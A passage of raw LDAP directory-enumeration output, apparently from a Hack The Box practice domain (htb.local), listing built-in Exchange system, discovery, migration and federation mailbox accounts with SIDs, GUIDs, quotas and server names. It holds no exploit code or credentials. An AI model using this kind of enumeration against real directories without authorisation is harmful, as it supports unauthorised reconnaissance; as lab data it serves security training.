proxyAddresses: SMTP:SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.l
 ocal
name: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
objectGUID:: 9KdxwgAw9UOjpHQavNi+ww==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPZQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=5f90cd7455db492fb2b3b90df3946396-Syste
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
msExchVersion: 1126140425011200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First 
 Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=loc
 al
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchRequireAuthToSendTo: TRUE
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMailboxGuid:: TtIV23r96U21SzhiG7UJTA==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526922558235973142298337353741329282
msExchUMDtmfMap: lastNameFirstName:7978366245269225582359731422983373537413292
 82
msExchUMDtmfMap: firstNameLastName:7978366245269225582359731422983373537413292
 82
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchCapabilityIdentifiers: 46
msExchCapabilityIdentifiers: 52
msExchCapabilityIdentifiers: 51
msExchCapabilityIdentifiers: 47
msExchCapabilityIdentifiers: 44
msExchCapabilityIdentifiers: 43
msExchCapabilityIdentifiers: 42
msExchCapabilityIdentifiers: 40
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
submissionContLength: 1048576
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchOABGeneratingMailboxBL: CN=Default Offline Address Book,CN=Offline Addre
 ss Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchan
 ge,CN=Services,CN=Configuration,DC=htb,DC=local
msExchRecipientTypeDetails: 8388608
mailNickname: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
msExchWhenMailboxCreated: 20190919114721.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, htb.local
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
sn: MsExchDiscovery e0dc1c29-89c3-4034-b678-e6c29d823ed9
distinguishedName: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114729.0Z
displayName: Microsoft Exchange
uSNCreated: 23787
uSNChanged: 24836
proxyAddresses: SMTP:SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.l
 ocal
name: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
objectGUID:: frjjGcomGUWzDMUFg/vZJQ==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPZgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=44aefc0a94d2429fa20e64cf51b1c537-Syste
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
msExchVersion: 1126140425011200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchRequireAuthToSendTo: TRUE
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMailboxGuid:: qgoyiL+jQEu0lkWXMv0iPQ==
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526930321229892340342678362293823339
msExchUMDtmfMap: lastNameFirstName:6739243472683793032122989234034267836229382
 3339
msExchUMDtmfMap: firstNameLastName:6739243472683793032122989234034267836229382
 3339
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchCapabilityIdentifiers: 41
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
msExchWhenMailboxCreated: 20190919114729.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, htb.loc
 al
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
sn: MsExchDiscoveryMailbox D919BA05-46A6-415f-80AD-7E09334BB852
distinguishedName: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334B
 B852},CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114840.0Z
displayName: Discovery Search Mailbox
uSNCreated: 23792
uSNChanged: 24875
proxyAddresses: SMTP:DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB8
 52}@htb.local
name: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
objectGUID:: Ja8BHHrgxU61HK3legZIDA==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPZwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_681f53d4942840e18
sAMAccountType: 805306368
showInAddressBook: CN=All Mailboxes(VLV),CN=All System Address Lists,CN=Addres
 s Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=
 Configuration,DC=htb,DC=local
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=4603f8b937e84923b718670f87760b7b-Disco
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
 2}@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
msExchVersion: 88218628259840
mDBOverHardQuotaLimit: 52428800
authOrigBL: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},C
 N=Users,DC=htb,DC=local
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchMailboxSecurityDescriptor:: AQAEjBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEAEAAAgAAAAACFAABAAIAAQEAAAAAAAUKAAAAAAIkAAEAAAABBQAAAAAABRUAA
 AAsHiW3FXWyFcWw809XBAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
delivContLength: 102400
authOrig: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=
 Users,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 134
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
mDBOverQuotaLimit: 52428800
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: tyyKW1N2rkG3YnWxFuh10g==
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:347268379732724624526939192205462641538023730933
 422852
msExchUMDtmfMap: lastNameFirstName:6739243472683796245269391922054626415380237
 30933422852
msExchUMDtmfMap: firstNameLastName:6739243472683796245269391922054626415380237
 30933422852
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
submissionContLength: 102400
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 536870912
mailNickname: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
msExchWhenMailboxCreated: 20190919114736.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
sn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
distinguishedName: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,
 DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114742.0Z
displayName: Microsoft Exchange Migration
uSNCreated: 23797
uSNChanged: 24846
proxyAddresses: SMTP:Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
name: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
objectGUID:: s1bU7YOEDEuVZumpiFilFg==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPaAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_1b41c9286325456bb
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=57e7055a5ddd483c8abc1df53105efc9-Migra
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
msExchVersion: 1126140425011200
mDBOverHardQuotaLimit: 307200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
mDBStorageQuota: 153600
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchRequireAuthToSendTo: TRUE
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchMessageHygieneSCLRejectThreshold: 7
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
mDBOverQuotaLimit: 307200
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMessageHygieneSCLQuarantineThreshold: 9
msExchMailboxGuid:: syuTWHYEuUOSJ6L0QmB0wA==
msExchMessageHygieneSCLJunkThreshold: 4
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:64472846683337716201143349621222623229136
msExchUMDtmfMap: lastNameFirstName:64472846683337716201143349621222623229136
msExchUMDtmfMap: firstNameLastName:64472846683337716201143349621222623229136
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchCapabilityIdentifiers: 48
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchMessageHygieneSCLDeleteThreshold: 9
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
msExchWhenMailboxCreated: 20190919114742.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
sn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
distinguishedName: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114748.0Z
displayName: Microsoft Exchange Federation Mailbox
uSNCreated: 23802
uSNChanged: 24851
proxyAddresses: SMTP:FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.l
 ocal
name: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
objectGUID:: Jpe+UhI/0U+hOqUjWjHlhw==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPaQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=1e107e142f7341cc8acb1597635d96e0-Feder
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
msExchVersion: 1126140425011200
mDBOverHardQuotaLimit: 1024
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
mDBStorageQuota: 1024
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchMessageHygieneSCLRejectThreshold: 7
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
mDBOverQuotaLimit: 1024
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMessageHygieneSCLQuarantineThreshold: 9
msExchMailboxGuid:: fD9/P9UhF0uiEChI8RY5QA==
msExchMessageHygieneSCLJunkThreshold: 4
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:3333728333624542134382817941489323002953213042
msExchUMDtmfMap: lastNameFirstName:3333728333624542134382817941489323002953213
 042
msExchUMDtmfMap: firstNameLastName:3333728333624542134382817941489323002953213
 042
msExchArchiveWarnQuota: 94371840
msExchRMSComputerAccountsLink: CN=EXCH01,CN=Computers,DC=htb,DC=local
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchMessageHygieneSCLDeleteThreshold: 9
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
msExchWhenMailboxCreated: 20190919114748.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
sn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
distinguishedName: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114755.0Z
displayName: E4E Encryption Store - Active
uSNCreated: 23807
uSNChanged: 24860
proxyAddresses: SMTP:SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.l
 ocal
name: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
objectGUID:: Yvc8FaVcu0SjkPENaJDM3w==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPagQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_7c96b981967141ebb
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=7faef2597f78442cb92fa80bfa3fe4ad-Syste
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
msExchVersion: 1126140425011200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications
 ,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=
 htb,DC=local
msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First 
 Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=loc
 al
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAAFAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchMessageHygieneSCLRejectThreshold: 7
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 130
msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMasterAccountSid:: AQEAAAAAAAUKAAAA
msExchMessageHygieneSCLQuarantineThreshold: 9
msExchMailboxGuid:: B27fWZaGWkSWt4VxrYsCNg==
msExchMessageHygieneSCLJunkThreshold: 4
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
msExchUMDtmfMap: emailAddress:797836624526930340920239247209233222869203201
msExchUMDtmfMap: lastNameFirstName:7978366245269303409202392472092332228692032
 01
msExchUMDtmfMap: firstNameLastName:7978366245269303409202392472092332228692032
 01
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 2
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
msExchMessageHygieneSCLDeleteThreshold: 9
msExchRecipientDisplayType: 10
mDBUseDefaults: FALSE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 8388608
mailNickname: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
msExchWhenMailboxCreated: 20190919114755.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
 local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
sn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
distinguishedName: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=U
 sers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111127.0Z
whenChanged: 20190919114801.0Z
displayName: Microsoft Exchange
uSNCreated: 23812
uSNChanged: 24868
proxyAddresses: SMTP:SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.l
 ocal
name: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
objectGUID:: 6gOmQ5y9aU++f9huTdNcAA==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPawQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountType: 805306368
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=7f26bba260144bd2b20640d80eea5c48-Syste
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
 al
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124636.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local
msExchVersion: 1126140425011200
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
